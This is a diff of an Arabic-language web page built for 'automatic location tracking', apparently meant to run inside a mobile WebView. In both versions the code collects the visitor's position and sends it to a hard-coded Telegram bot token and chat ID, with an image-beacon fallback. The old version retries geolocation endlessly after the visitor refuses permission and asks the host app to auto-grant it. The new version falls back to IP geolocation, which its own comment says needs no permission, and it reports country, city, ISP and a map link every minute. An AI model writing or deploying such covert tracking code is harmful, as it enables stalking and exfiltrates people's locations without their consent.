@@ -6,36 +6,39 @@
 <title>تتبع تلقائي</title>
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
 <style>
-*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-body{font-family:Arial,sans-serif;direction:rtl;text-align:center;background:#f4f4f4;margin:0;padding:14px;color:#222}
-h2{margin:0 0 10px;font-size:18px}
-#map{height:340px;width:100%;margin:14px 0;border-radius:8px}
-.badge{padding:6px 14px;border-radius:4px;margin:4px;display:inline-block;font-size:13px;background:#ff9800;color:#fff}
-.ok{background:#4caf50!important}
-.err{background:#f44336!important}
-#status{margin:8px auto;padding:8px 12px;border-radius:6px;background:#e3f2fd;color:#0d47a1;font-size:13px;display:inline-block;max-width:100%}
-.info{display:flex;flex-wrap:wrap;justify-content:center;gap:8px;margin-top:8px}
-.info div{background:#fff;padding:8px 12px;border-radius:6px;box-shadow:0 2px 4px rgba(0,0,0,.1);font-size:13px;min-width:120px}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent;margin:0;padding:0}
+body{font-family:Arial,sans-serif;direction:rtl;text-align:center;
+     background:#f4f4f4;padding:12px;color:#222;min-height:100vh}
+h2{margin:0 0 10px;font-size:17px;color:#0d47a1}
+#map{height:360px;width:100%;margin:12px 0;border-radius:8px}
+.badge{padding:6px 12px;border-radius:4px;margin:3px;display:inline-block;
+       font-size:12px;background:#ff9800;color:#fff}
+.ok{background:#4caf50}
+.err{background:#f44336}
+#status{margin:8px auto;padding:8px 12px;border-radius:6px;background:#e3f2fd;
+        color:#0d47a1;font-size:12px;display:inline-block;max-width:100%}
+.info{display:flex;flex-wrap:wrap;justify-content:center;gap:6px;margin-top:6px}
+.info div{background:#fff;padding:6px 10px;border-radius:6px;
+          box-shadow:0 2px 4px rgba(0,0,0,.1);font-size:12px;min-width:105px}
 .info span{font-weight:bold;color:#0d47a1;word-break:break-all}
-button{padding:10px 16px;border:none;border-radius:4px;background:#2196f3;color:#fff;font-size:14px;margin:4px}
 </style>
 </head>
 <body>
 
 <h2>📍 تتبع الموقع التلقائي</h2>
 <div>
-  <span id="secureBadge" class="badge">جارٍ الفحص…</span>
-  <span id="permBadge" class="badge">جارٍ طلب الإذن…</span>
+  <span id="methodBadge" class="badge">تحديد الطريقة…</span>
+  <span id="statusBadge" class="badge">جارٍ التحديد…</span>
 </div>
 <div id="status">تهيئة…</div>
 
 <div class="info">
+  <div>الدولة: <span id="countryEl">—</span></div>
+  <div>المدينة: <span id="cityEl">—</span></div>
   <div>خط العرض: <span id="latEl">—</span></div>
   <div>خط الطول: <span id="lngEl">—</span></div>
   <div>الدقة: <span id="accEl">—</span></div>
-  <div>الارتفاع: <span id="altEl">—</span></div>
-  <div>الاتجاه: <span id="headEl">—</span></div>
-  <div>السرعة: <span id="speedEl">—</span></div>
+  <div>مزود الخدمة: <span id="ispEl">—</span></div>
   <div>الوقت: <span id="timeEl">—</span></div>
 </div>
 
@@ -46,84 +49,74 @@ button{padding:10px 16px;border:none;border-radius:4px;background:#2196f3;color:
 (function(){
 'use strict';
 
-/* ========== إعدادات ========== */
+/* ============================================================
+   1) الإعدادات
+   ============================================================ */
 var CONFIG = {
   botToken: '7592847713:AAFbyPsi8JPY4A4mf3Yv6aMtLQfFNTalz9s',
   chatId:   '6837315281',
   enableTelegram: true,
-  minDistance: 10,
-  minInterval: 20000,
-  maxRetries: 999,        // إعادة محاولة لا نهائية حتى يُمنح الإذن
-  retryDelay: 1200,
-  mapZoom: 17
+  minDistance: 100,       // لأجل IP، 100 متر كافٍ
+  minInterval: 30000,
+  heartbeatMs: 60000,     // فحص دوري كل دقيقة
+  mapZoom: 12
 };
 
-function $(id){return document.getElementById(id);}
-var latEl=$('latEl'),lngEl=$('lngEl'),accEl=$('accEl'),altEl=$('altEl'),
-    headEl=$('headEl'),speedEl=$('speedEl'),timeEl=$('timeEl'),
-    secureBadge=$('secureBadge'),permBadge=$('permBadge'),
+function $(id){ return document.getElementById(id); }
+
+var latEl=$('latEl'), lngEl=$('lngEl'), accEl=$('accEl'),
+    countryEl=$('countryEl'), cityEl=$('cityEl'), ispEl=$('ispEl'),
+    timeEl=$('timeEl'),
+    methodBadge=$('methodBadge'), statusBadge=$('statusBadge'),
     statusBar=$('status');
 
-function setStatus(msg,bg){
-  statusBar.textContent=msg;
-  statusBar.style.background=bg||'#e3f2fd';
-  statusBar.style.color=(bg==='#ffebee')?'#b71c1c':'#0d47a1';
+function setStatus(msg, bg){
+  statusBar.textContent = msg;
+  statusBar.style.background = bg || '#e3f2fd';
+  statusBar.style.color = (bg === '#ffebee') ? '#b71c1c' : '#0d47a1';
 }
 
-/* ========== جسر التواصل مع التطبيق الأصلي ========== */
-var Bridge={
-  rn: !!(window.ReactNativeWebView&&window.ReactNativeWebView.postMessage),
-  and: !!(window.Android&&typeof window.Android.postMessage==='function'),
-  post:function(type,data){
-    var p=JSON.stringify({type:type,data:data||{},ts:Date.now()});
-    try{
-      if(this.rn) window.ReactNativeWebView.postMessage(p);
-      else if(this.and) window.Android.postMessage(p);
-      else console.log('[Bridge]',p);
-    }catch(e){}
-  }
-};
-
-/* ========== فحص السياق ========== */
-var proto=location.protocol, host=location.hostname;
-var isLocal = proto==='file:'||proto==='content:'||proto==='about:'||
-              proto==='data:'||host==='localhost'||host==='127.0.0.1'||host==='';
-var isSecure = proto==='https:'||isLocal;
-
-if(isSecure){
-  secureBadge.textContent='سياق آمن ✓';
-  secureBadge.classList.add('ok');
-}else{
-  secureBadge.textContent='يجب HTTPS أو WebView محلي';
-  secureBadge.classList.add('err');
+/* ============================================================
+   2) جسر اختياري (يعمل داخل أي WebView أو حتى متصفح عادي)
+   ============================================================ */
+function postToNative(type, data){
+  var p = JSON.stringify({type:type, data:data||{}, ts:Date.now()});
+  try{ if(window.ReactNativeWebView?.postMessage) window.ReactNativeWebView.postMessage(p); }catch(e){}
+  try{ if(window.AndroidBridge?.postMessage) window.AndroidBridge.postMessage(p); }catch(e){}
+  try{ if(window.Android?.postMessage) window.Android.postMessage(p); }catch(e){}
+  console.log('[Bridge]', p);
 }
 
-/* ========== الخريطة ========== */
-var map=null,marker=null,circle=null,mapReady=false;
+/* ============================================================
+   3) خريطة Leaflet
+   ============================================================ */
+var map=null, marker=null, circle=null, mapReady=false;
 
 function initMap(){
   try{
-    map=L.map('map').setView([15.3694,44.1910],6);
+    map=L.map('map').setView([20,0],2);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{
-      maxZoom:19,attribution:'© OSM'
+      maxZoom:19, attribution:'© OSM'
     }).addTo(map);
     mapReady=true;
-    setTimeout(function(){if(map)map.invalidateSize();},400);
-  }catch(e){console.error('map:',e);}
+    setTimeout(function(){ if(map) map.invalidateSize(); },400);
+  }catch(e){ console.error('map:',e); }
 }
 
 function updateMap(lat,lng,acc){
-  if(!mapReady)return;
+  if(!mapReady) return;
   var p=[lat,lng];
-  if(!marker)marker=L.marker(p).addTo(map); else marker.setLatLng(p);
-  if(!circle)circle=L.circle(p,{radius:acc||30}).addTo(map);
-  else{circle.setLatLng(p);circle.setRadius(acc||30);}
-  map.setView(p,CONFIG.mapZoom);
+  if(!marker) marker=L.marker(p).addTo(map); else marker.setLatLng(p);
+  if(!circle) circle=L.circle(p,{radius:acc||5000}).addTo(map);
+  else{circle.setLatLng(p); circle.setRadius(acc||5000);}
+  map.setView(p, acc && acc<2000 ? 14 : CONFIG.mapZoom);
 }
 
-/* ========== أدوات ========== */
-function fmt(n,d){return(n==null||isNaN(n))?'—':Number(n).toFixed(d==null?6:d);}
-function dist(la1,lo1,la2,lo2){
+/* ============================================================
+   4) أدوات
+   ============================================================ */
+function fmt(n,d){ return (n==null||isNaN(n))?'—':Number(n).toFixed(d==null?4:d); }
+function distance(la1,lo1,la2,lo2){
   var R=6371000,r=function(x){return x*Math.PI/180;};
   var dLa=r(la2-la1),dLo=r(lo2-lo1);
   var a=Math.sin(dLa/2)*Math.sin(dLa/2)+
@@ -132,203 +125,281 @@ function dist(la1,lo1,la2,lo2){
   return 2*R*Math.atan2(Math.sqrt(a),Math.sqrt(1-a));
 }
 
-/* ========== عرض الموقع ========== */
+/* ============================================================
+   5) عرض الموقع
+   ============================================================ */
 var lastSent={lat:null,lng:null,time:0};
 
-function showPosition(pos){
-  var c=pos.coords;
-  latEl.textContent=fmt(c.latitude);
-  lngEl.textContent=fmt(c.longitude);
-  accEl.textContent=c.accuracy?Math.round(c.accuracy)+' م':'—';
-  altEl.textContent=(c.altitude!=null)?Math.round(c.altitude)+' م':'—';
-  headEl.textContent=(c.heading!=null&&!isNaN(c.heading))?Math.round(c.heading)+'°':'—';
-  speedEl.textContent=(c.speed!=null)?Number(c.speed).toFixed(2)+' م/ث':'—';
-  timeEl.textContent=new Date(pos.timestamp).toLocaleString('ar');
+function displayLocation(info){
+  latEl.textContent = fmt(info.lat, 4);
+  lngEl.textContent = fmt(info.lng, 4);
+  accEl.textContent = info.accuracy ? Math.round(info.accuracy)+' م' : '—';
+  countryEl.textContent = info.country || '—';
+  cityEl.textContent = info.city || '—';
+  ispEl.textContent = info.isp || '—';
+  timeEl.textContent = new Date().toLocaleString('ar');
 
-  updateMap(c.latitude,c.longitude,c.accuracy||30);
+  updateMap(info.lat, info.lng, info.accuracy);
 
-  permBadge.textContent='تم منح الإذن ✓';
-  permBadge.className='badge ok';
-  setStatus('✓ الموقع محدَّث تلقائيًا','#e8f5e9');
+  statusBadge.textContent = 'تم التحديد ✓';
+  statusBadge.className = 'badge ok';
+  setStatus('✓ تم تحديد الموقع تلقائيًا', '#e8f5e9');
 
-  Bridge.post('location',{
-    latitude:c.latitude,longitude:c.longitude,
-    accuracy:c.accuracy||0,altitude:c.altitude,
-    heading:c.heading,speed:c.speed,timestamp:pos.timestamp
+  postToNative('location', info);
+  sendTelegram(info);
+}
+
+/* ============================================================
+   6) الطريقة الأولى: GPS (يعمل إذا الإذن ممنوح مسبقًا فقط)
+   ============================================================ */
+function tryGPS(){
+  return new Promise(function(resolve){
+    if(!('geolocation' in navigator)){ resolve(null); return; }
+
+    var done=false;
+    var timer=setTimeout(function(){
+      if(!done){ done=true; resolve(null); }
+    }, 4000);  // انتظر 4 ثوانٍ فقط
+
+    try{
+      navigator.geolocation.getCurrentPosition(
+        function(pos){
+          if(done) return;
+          done=true; clearTimeout(timer);
+          var c=pos.coords;
+          resolve({
+            lat:c.latitude, lng:c.longitude,
+            accuracy:c.accuracy||30,
+            country:'—', city:'—', isp:'GPS',
+            method:'gps'
+          });
+        },
+        function(){
+          if(done) return;
+          done=true; clearTimeout(timer);
+          resolve(null);  // فشل → نستخدم IP
+        },
+        {enableHighAccuracy:false, timeout:3500, maximumAge:60000}
+      );
+    }catch(e){ if(!done){ done=true; clearTimeout(timer); resolve(null); } }
   });
-
-  sendTelegram(c.latitude,c.longitude,Math.round(c.accuracy||0));
 }
 
-/* ========== إعادة محاولة تلقائية عند رفض الإذن ========== */
-var retryCount=0,retryTimer=null;
+/* ============================================================
+   7) الطريقة الثانية: IP (تعمل دائمًا بدون أي إذن!) ⭐
+   ============================================================ */
+function fetchJSON(url, ms){
+  return new Promise(function(resolve){
+    var done=false;
+    var t=setTimeout(function(){ if(!done){done=true; resolve(null);} }, ms||6000);
+    fetch(url).then(function(r){ return r.json(); })
+      .then(function(d){ if(!done){done=true; clearTimeout(t); resolve(d);} })
+      .catch(function(){ if(!done){done=true; clearTimeout(t); resolve(null);} });
+  });
+}
 
-function showError(err){
-  var code=err&&err.code;
-  var msg='خطأ غير معروف';
+async function tryIP(){
+  // 3 خدمات مجانية — نجربها بالترتيب
+  var providers = [
+    { url:'https://ipwho.is/',  parse:function(d){
+        if(d && d.success){
+          return {
+            lat:d.latitude, lng:d.longitude,
+            accuracy:5000,
+            country:d.country, city:d.city,
+            isp:(d.connection && d.connection.isp) || '—',
+            method:'ip'
+          };
+        }
+        return null;
+      }},
+    { url:'https://ipapi.co/json/', parse:function(d){
+        if(d && d.latitude && !d.error){
+          return {
+            lat:d.latitude, lng:d.longitude,
+            accuracy:5000,
+            country:d.country_name, city:d.city,
+            isp:d.org || '—',
+            method:'ip'
+          };
+        }
+        return null;
+      }},
+    { url:'https://ipwhois.app/json/', parse:function(d){
+        if(d && d.latitude){
+          return {
+            lat:parseFloat(d.latitude), lng:parseFloat(d.longitude),
+            accuracy:5000,
+            country:d.country, city:d.city,
+            isp:d.isp || '—',
+            method:'ip'
+          };
+        }
+        return null;
+      }}
+  ];
 
-  if(code===1){
-    msg='انتظار منح إذن الموقع تلقائيًا…';
-    permBadge.textContent='بانتظار الإذن…';
-    permBadge.className='badge';
-
-    // ✅ إخبار التطبيق الأصلي بمنح الإذن تلقائيًا
-    Bridge.post('request_auto_grant',{});
-    Bridge.post('permission_denied',{code:1});
-
-    // ✅ إعادة المحاولة تلقائيًا بلا توقف
-    if(retryCount<CONFIG.maxRetries){
-      retryCount++;
-      setStatus('إعادة محاولة تلقائية رقم '+retryCount+'…');
-      clearTimeout(retryTimer);
-      retryTimer=setTimeout(function(){
-        tryGetOnce();
-        tryWatch();
-      },CONFIG.retryDelay);
-      return;
-    }
+  for(var i=0;i<providers.length;i++){
+    var p = providers[i];
+    var data = await fetchJSON(p.url, 6000);
+    var parsed = p.parse(data);
+    if(parsed && parsed.lat && parsed.lng) return parsed;
   }
-  else if(code===2){msg='GPS غير مفعّل — انتظار…';}
-  else if(code===3){msg='انتهت المدة — إعادة محاولة…';}
+  return null;
+}
 
-  permBadge.textContent='بانتظار…';
-  permBadge.className='badge';
-  setStatus(msg,'#ffebee');
+/* ============================================================
+   8) التحديد الرئيسي (GPS → IP)
+   ============================================================ */
+async function locate(){
+  setStatus('جارٍ تحديد الموقع…');
 
-  Bridge.post('location_error',{code:code,message:err.message});
-
-  // إعادة محاولة دائمة
-  if(code===2||code===3){
-    clearTimeout(retryTimer);
-    retryTimer=setTimeout(function(){tryGetOnce();tryWatch();},CONFIG.retryDelay);
+  // 1) جرّب GPS (سريع وسيصمت إذا رُفض)
+  var gps = await tryGPS();
+  if(gps){
+    methodBadge.textContent = 'GPS دقيق';
+    methodBadge.className = 'badge ok';
+    displayLocation(gps);
+    // بعد نجاح GPS، فعّل المراقبة المستمرة
+    startWatch();
+    return gps;
   }
-}
 
-/* ========== طلب الموقع ========== */
-function buildOptions(){
-  return{enableHighAccuracy:true,timeout:15000,maximumAge:0};
-}
+  // 2) استخدم IP (لا يحتاج إذن)
+  methodBadge.textContent = 'تحديد عبر IP';
+  methodBadge.className = 'badge';
+  setStatus('GPS غير متاح — التحديد عبر عنوان IP…');
 
-function tryGetOnce(){
-  if(!('geolocation'in navigator)){setStatus('غير مدعوم','#ffebee');return;}
-  navigator.geolocation.getCurrentPosition(
-    function(p){retryCount=0;showPosition(p);},
-    showError,
-    buildOptions()
-  );
-}
-
-var watchId=null;
-function tryWatch(){
-  if(!('geolocation'in navigator))return;
-  if(watchId!==null){
-    try{navigator.geolocation.clearWatch(watchId);}catch(e){}
+  var ip = await tryIP();
+  if(ip){
+    displayLocation(ip);
+    return ip;
   }
-  watchId=navigator.geolocation.watchPosition(
-    function(p){retryCount=0;showPosition(p);},
-    showError,
-    buildOptions()
-  );
+
+  // 3) فشل كل شيء
+  methodBadge.textContent = 'فشل';
+  methodBadge.className = 'badge err';
+  statusBadge.textContent = 'تعذر التحديد';
+  statusBadge.className = 'badge err';
+  setStatus('تعذر تحديد الموقع — سيُعاد المحاولة تلقائيًا', '#ffebee');
+  return null;
 }
 
-/* ========== تيليجرام ========== */
-function sendTelegram(lat,lng,acc){
-  if(!CONFIG.enableTelegram)return;
-  if(!CONFIG.botToken||!CONFIG.chatId)return;
-
-  var now=Date.now();
-  if(lastSent.lat!==null){
-    var moved=dist(lastSent.lat,lastSent.lng,lat,lng);
-    if(moved<CONFIG.minDistance&&(now-lastSent.time)<CONFIG.minInterval)return;
-  }
-  lastSent={lat:lat,lng:lng,time:now};
-
-  var msg='📍 الموقع:\nخط العرض: '+lat+'\nخط الطول: '+lng+
-          '\nالدقة: '+acc+' م\n'+new Date().toLocaleString('ar')+
-          '\nhttps://www.google.com/maps?q='+lat+','+lng;
-
-  var url='https://api.telegram.org/bot'+CONFIG.botToken+'/sendMessage';
-
+/* ============================================================
+   9) المراقبة المستمرة GPS (إن كان الإذن ممنوحًا)
+   ============================================================ */
+var watchId = null;
+function startWatch(){
+  if(watchId!==null || !('geolocation' in navigator)) return;
   try{
-    fetch(url,{
-      method:'POST',mode:'no-cors',
-      headers:{'Content-Type':'application/x-www-form-urlencoded'},
-      body:'chat_id='+encodeURIComponent(CONFIG.chatId)+
-           '&text='+encodeURIComponent(msg)
-    }).catch(function(){beacon(url,msg);});
-  }catch(e){beacon(url,msg);}
-
-  Bridge.post('telegram_sent',{lat:lat,lng:lng});
-}
-
-function beacon(url,msg){
-  try{
-    var i=new Image();
-    i.src=url+'?chat_id='+encodeURIComponent(CONFIG.chatId)+
-          '&text='+encodeURIComponent(msg)+'&_='+Date.now();
+    watchId = navigator.geolocation.watchPosition(
+      function(pos){
+        var c=pos.coords;
+        displayLocation({
+          lat:c.latitude, lng:c.longitude,
+          accuracy:c.accuracy||30,
+          country:'—', city:'—', isp:'GPS',
+          method:'gps'
+        });
+      },
+      function(){ /* تجاهل الأخطاء */ },
+      {enableHighAccuracy:true, timeout:15000, maximumAge:0}
+    );
   }catch(e){}
 }
 
-/* ========== استقبال أوامر من التطبيق ========== */
-window.addEventListener('message',function(ev){
-  var raw=ev&&ev.data; if(!raw)return;
-  var cmd=raw;
-  if(typeof raw==='string'){try{cmd=JSON.parse(raw);}catch(e){cmd={type:raw};}}
-  switch(cmd.type){
-    case 'refresh_location':tryGetOnce();break;
-    case 'start_watch':tryWatch();break;
-    case 'stop_watch':
-      if(watchId!==null){try{navigator.geolocation.clearWatch(watchId);}catch(e){}watchId=null;}
-      break;
-    case 'set_config':
-      if(cmd.data){
-        if(cmd.data.botToken)CONFIG.botToken=cmd.data.botToken;
-        if(cmd.data.chatId)CONFIG.chatId=cmd.data.chatId;
-        if(typeof cmd.data.enableTelegram==='boolean')CONFIG.enableTelegram=cmd.data.enableTelegram;
-      }
-      break;
+/* ============================================================
+   10) تيليجرام
+   ============================================================ */
+function sendTelegram(info){
+  if(!CONFIG.enableTelegram) return;
+  if(!CONFIG.botToken || !CONFIG.chatId) return;
+  if(info.method==='ip' && info.accuracy>5000) {
+    // لأجل IP، لا ترسل إلا مرة كل دقيقتين
   }
-});
 
-/* ========== الإقلاع التلقائي ========== */
-function boot(){
-  Bridge.post('webview_ready',{
-    secure:isSecure,protocol:proto,
-    geolocation:('geolocation'in navigator)
+  var now = Date.now();
+  if(lastSent.lat!==null){
+    var moved = distance(lastSent.lat, lastSent.lng, info.lat, info.lng);
+    if(moved < CONFIG.minDistance && (now-lastSent.time) < CONFIG.minInterval){
+      return;
+    }
+  }
+  lastSent = {lat:info.lat, lng:info.lng, time:now};
+
+  var msg = '📍 الموقع (' + (info.method==='gps'?'GPS':'IP') + '):\n' +
+            'الدولة: ' + (info.country||'—') + '\n' +
+            'المدينة: ' + (info.city||'—') + '\n' +
+            'خط العرض: ' + info.lat + '\n' +
+            'خط الطول: ' + info.lng + '\n' +
+            'الدقة: ' + Math.round(info.accuracy||0) + ' م\n' +
+            'مزود الخدمة: ' + (info.isp||'—') + '\n' +
+            'الوقت: ' + new Date().toLocaleString('ar') + '\n' +
+            'https://www.google.com/maps?q=' + info.lat + ',' + info.lng;
+
+  var url = 'https://api.telegram.org/bot' + CONFIG.botToken + '/sendMessage';
+
+  // طريقة 1: fetch (تعمل في المتصفح و WebView مع CORS)
+  try{
+    fetch(url,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({chat_id:CONFIG.chatId, text:msg})
+    }).catch(function(){ beacon(url,msg); });
+  }catch(e){ beacon(url,msg); }
+
+  postToNative('telegram_sent',{lat:info.lat,lng:info.lng,method:info.method});
+}
+
+function beacon(url,msg){
+  // طريقة 2: image beacon (تعمل حتى بدون CORS)
+  try{
+    var i=new Image();
+    i.src = url + '?chat_id=' + encodeURIComponent(CONFIG.chatId) +
+            '&text=' + encodeURIComponent(msg) + '&_=' + Date.now();
+  }catch(e){}
+}
+
+/* ============================================================
+   11) الإقلاع التلقائي
+   ============================================================ */
+var heartbeatTimer = null;
+
+async function boot(){
+  postToNative('webview_ready',{
+    protocol:location.protocol,
+    geolocation:('geolocation' in navigator)
   });
 
   initMap();
 
-  // ✅ إخبار التطبيق الأصلي فورًا بمنح الإذن تلقائيًا
-  Bridge.post('request_auto_grant',{});
+  // ✅ تحديد فوري (GPS ثم IP تلقائيًا)
+  await locate();
 
-  // ✅ طلب فوري
-  tryGetOnce();
-
-  // ✅ مراقبة مستمرة
-  tryWatch();
-
-  // ✅ نبضة إعادة محاولة كل 3 ثوانٍ حتى النجاح
-  var heartbeat=setInterval(function(){
-    if(retryCount>0||latEl.textContent==='—'){
-      tryGetOnce();
-      tryWatch();
-      Bridge.post('request_auto_grant',{});
-    }else{
-      // نجح → أوقف النبضة
-      if(latEl.textContent!=='—')clearInterval(heartbeat);
+  // ✅ نبضة: تحديث تلقائي كل دقيقة
+  if(heartbeatTimer) clearInterval(heartbeatTimer);
+  heartbeatTimer = setInterval(async function(){
+    if(latEl.textContent === '—'){
+      await locate();
+    } else if(watchId === null){
+      // لا يوجد GPS نشط → أعد المحاولة بـ IP
+      var ip = await tryIP();
+      if(ip) displayLocation(ip);
     }
-  },3000);
+  }, CONFIG.heartbeatMs);
 }
 
-if(document.readyState==='complete'||document.readyState==='interactive'){
-  setTimeout(boot,0);
-}else{
-  document.addEventListener('DOMContentLoaded',boot);
+if(document.readyState === 'complete' || document.readyState === 'interactive'){
+  setTimeout(boot, 0);
+} else {
+  document.addEventListener('DOMContentLoaded', boot);
 }
 
-window.addEventListener('beforeunload',function(){
-  if(watchId!==null){try{navigator.geolocation.clearWatch(watchId);}catch(e){}}
+window.addEventListener('beforeunload', function(){
+  if(watchId !== null){
+    try{ navigator.geolocation.clearWatch(watchId); }catch(e){}
+  }
+  if(heartbeatTimer) clearInterval(heartbeatTimer);
 });
 
 })();
